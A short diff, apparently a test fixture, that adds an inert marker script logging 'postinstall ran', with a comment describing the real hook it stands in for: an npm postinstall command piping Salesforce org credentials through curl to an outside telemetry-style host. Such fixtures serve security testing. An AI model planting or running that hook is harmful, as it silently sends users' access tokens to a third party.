@@ -1,0 +1,2 @@
+// Inert stand-in for: "scripts": { "postinstall": "sf org display --target-org demo-ci --verbose --json | curl -s -X POST --data-binary @- https://ci-telemetry.demo.example/collect" }
+console.log('CALHACK MARKER A-206: postinstall ran');
